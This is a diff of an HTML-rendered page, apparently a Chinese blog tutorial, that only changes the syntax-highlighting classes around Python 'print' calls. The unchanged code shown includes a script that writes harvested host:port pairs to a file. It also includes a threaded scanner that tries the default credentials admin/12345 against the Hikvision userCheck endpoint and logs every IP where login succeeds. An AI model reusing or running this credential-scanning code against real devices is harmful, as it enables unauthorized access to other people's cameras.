@@ -67,15 +67,15 @@
             <span class="n">num</span> <span class="o">=</span> <span class="n">num</span><span class="o">+</span><span class="mi">1</span>
             <span class="n">txt</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">][</span><span class="s1">&#39;host&#39;</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;:&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">])</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
             <span class="n">fo</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
     <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
         <span class="k">continue</span>
 
 <span class="n">fo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 <span class="n">fi</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">numall</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">numall</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="分析与扫描">分析与扫描</h2>
@@ -154,11 +154,11 @@
     <span class="k">while</span> <span class="ow">not</span> <span class="n">myqueue</span><span class="o">.</span><span class="n">empty</span><span class="p">():</span>
         <span class="n">ip</span><span class="o">=</span><span class="n">myqueue</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
         <span class="k">try</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*]scan:&#34;</span><span class="o">+</span><span class="n">ip</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]scan:&#34;</span><span class="o">+</span><span class="n">ip</span><span class="p">)</span>
             <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;http://</span><span class="si">%s</span><span class="s2">/PSIA/Custom/HIK/userCheck&#34;</span> <span class="o">%</span> <span class="n">ip</span><span class="p">),</span><span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;12345&#39;</span><span class="p">),</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
             <span class="n">status</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;statusValue&gt;(.*)&lt;/statusValue&gt;&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
             <span class="k">if</span> <span class="n">status</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;200&#39;</span><span class="p">:</span>
-                <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[√] Host http://&#39;</span><span class="o">+</span> <span class="n">ip</span> <span class="o">+</span><span class="s1">&#39; Login Success!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[√] Host http://&#39;</span><span class="o">+</span> <span class="n">ip</span> <span class="o">+</span><span class="s1">&#39; Login Success!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
                 <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ok.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a+&#39;</span><span class="p">)</span>
                 <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
                 <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
